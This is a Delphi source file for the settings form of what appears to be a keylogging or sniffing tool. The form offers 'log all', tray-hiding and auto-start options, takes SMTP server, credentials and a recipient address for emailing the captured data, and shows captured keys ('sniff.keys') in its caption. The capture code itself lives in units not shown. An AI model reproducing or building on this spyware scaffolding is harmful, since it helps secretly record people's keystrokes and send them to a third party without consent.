unit uWLogFrm;

interface

uses
  Windows, Classes, Forms, Controls, ComCtrls, StdCtrls,
  idSMTP, IdMessage, IdAttachmentFile,
  uSniff, XNetDetect_v2;


type

  TSnfwin = class(TForm)
    pcMain: TPageControl;
    TabSheet4: TTabSheet;
    GroupBox1: TGroupBox;
    chkLogAll: TCheckBox;
    chkAddToTray: TCheckBox;
    chkAutoStart: TCheckBox;
    GroupBox2: TGroupBox;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label5: TLabel;
    edMailTo: TEdit;
    edSMTPServer: TEdit;
    edUserName: TEdit;
    edPassword: TEdit;
    GroupBox3: TGroupBox;
    btnStart: TButton;
    procedure FormDestroy(Sender: TObject);
    procedure FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure btnApplyClick(Sender: TObject);
  protected
  public
    procedure Init;
  public
    sniff:csniff;
  end;

var
  Snfwin: TSnfwin;


implementation

{$R *.dfm}

var
  HSharedData : THandle;

procedure TSnfwin.init;
begin
  sniff:=csniff.Create(self);
end;

procedure TSnfwin.btnApplyClick(Sender: TObject);
begin
  sniff.IdSMTP.Host:= edSMTPServer.Text;
  sniff.IdSMTP.Username:= edUserName.text;
  sniff.IdSMTP.Password:= edPassword.Text;
  // получатель
  sniff.Msg.Recipients.EMailAddresses:=edMailto.Text;
end;

procedure TSnfwin.FormDestroy(Sender: TObject);
begin
  sniff.destroy;
end;

procedure TSnfwin.FormKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  caption:=sniff.keys;
end;

initialization

end.
